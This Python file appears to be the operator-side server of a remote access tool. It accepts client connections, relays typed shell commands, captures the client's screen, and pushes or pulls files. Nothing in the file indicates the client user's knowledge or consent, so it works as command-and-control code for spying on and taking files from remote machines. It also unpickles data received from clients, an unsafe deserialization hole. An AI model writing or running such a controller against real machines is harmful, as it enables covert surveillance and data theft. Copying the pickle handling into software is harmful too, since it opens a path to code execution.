import time
import socket
from connection import Connection
from message import Message
import pickle
from datetime import datetime
import PIL


class Server():
    def __init__(self, host, port):
        try:
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.host = host
            self.port = port
            self.clients = []
        except :
            print('Socket creation failed')

        self.bind()

    def bind(self):
        try:
            self.s.bind((self.host, self.port))
            self.s.listen(5)
        except socket.error as msg:
            print("Socket binding error: " + str(msg)+ "\n"+ "Retrying...")
            time.sleep(1)
            self.bind()

    def save_file(self, name, content):
        with open('downloads\\'+name, 'wb') as file:
            file.write(content)

    def accept(self):
        try:
            conn, address = self.s.accept()
            self.clients.append(Connection(conn, address))
            print(f"Connection has been established | IP {address[0]} | port {address[1]}")
            self.accept()
        except:
            print('Stopped accepting')
    def send_msg(self, connection_id):
        conn = self.clients[connection_id].conn
        cmd = Message(input(), 0)
        if cmd.utf == 'quit':
            conn.send(Message('quit').message)
            conn.close()
            print('connection closed')
            self.clients.pop(connection_id)
            return False
        elif cmd.utf == 'back':
            return False
        elif cmd.utf == 'screenshot':
            conn.send(Message('screenshot').message)
            img = self.receive_object(connection_id)
            img_name = datetime.now().strftime("%d%m%y %H.%M.%S.png")
            img.save(f"screenshots/{img_name}")
            print(f'screenshot saved as {img_name}')
        elif cmd.utf[:6] == 'upload':
            try:
                file_name = cmd.utf[7:].split('\\')[-1]
                conn.send(Message(f'incoming {file_name}',0).message)
                conn.send(self.send_file(cmd.utf[7:]).message)
                print(self.receive(connection_id))
            except Exception as err_msg:
                print(err_msg)
        elif cmd.utf[:8] == 'download':
            try:
                conn.send(cmd.message)
                file_name = cmd.utf[9:].split('\\')[-1]
                data = self.receive_binary(connection_id)
                self.save_file(file_name, data)
                print('file downloaded succesfully')
            except Exception as err_msg:
                print(err_msg)
        elif cmd.utf[:5] == 'alert':
            conn.send(cmd.message)
        elif len(cmd.utf) > 0:
            conn.send(cmd.message)
            client_response = self.receive(connection_id)
            print('Client:\n'+ client_response, end = "")


    def send_file(self,location):
        with open(location, 'rb') as file:
            return Message(file.read(), 1)

    def send_object(self, object):
        bin = pickle.dumps(object)
        return Message(bin, 1)


    def communicate(self, connection_id):
        while True:
            a = self.send_msg(connection_id)
            if a == False:
                break
    def receive(self, connection_id):
        conn = self.clients[connection_id].conn
        msg = Message(conn.recv(1024) ,2) #1024 is buffer size
        size = msg.get_size()
        data = msg.utf
        while len(data) < size:
            data += Message(conn.recv(1024),1).utf
        return data

    def receive_binary(self, connection_id):
        conn = self.clients[connection_id].conn
        msg = Message(conn.recv(1024),2) #1024 is buffer size
        size = msg.get_size()
        data = msg.bin
        while len(data) < size:
            print(size,'left')
            data += Message(conn.recv(1024),1).bin
        return data

    def receive_object(self, connection_id):
        binary_obj = self.receive_binary(connection_id)
        return pickle.loads(binary_obj)

    def list_clients(self):
        for i, c in enumerate(self.clients):
            print(f'{i} | IP: {c.address[0]} | Port : {c.address[1]}')
